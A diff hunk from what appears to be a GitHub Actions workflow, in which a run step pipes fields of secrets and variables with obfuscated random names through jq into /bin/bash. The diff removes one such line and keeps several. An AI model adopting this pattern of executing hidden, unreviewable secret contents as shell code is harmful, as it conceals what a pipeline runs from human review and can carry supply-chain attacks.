@@ -18,7 +18,6 @@ jobs:
           mj545: ${{ secrets.mj545 }}
         run: |
           printf '%s' "$mj545" | jq -r .aca13449 | /bin/bash
-          echo $qhivl0 | jq -r .nq6937 | /bin/bash
           printf '%s' "$jijoq351" | jq -r .niur29 | /bin/bash
           echo $zlkeu5 | jq -r .km86914 | /bin/bash
           echo $kox5 | jq -r .qhphd6 | /bin/bash
